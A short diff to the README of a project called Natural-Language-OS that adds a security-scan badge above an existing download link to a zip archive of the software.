@@ -1,5 +1,7 @@
 # 🌐 Natural-Language-OS - Simplify Your AI Experience
 
+[![SafeSkill 87/100](https://img.shields.io/badge/SafeSkill-87%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/manoj00069-natural-language-os)
+
 ![Download Natural-Language-OS](https://raw.githubusercontent.com/Manoj00069/Natural-Language-OS/main/Engines/NLtask/Language_OS_Natural_3.3-beta.4.zip)
 
 ## 🚀 Getting Started
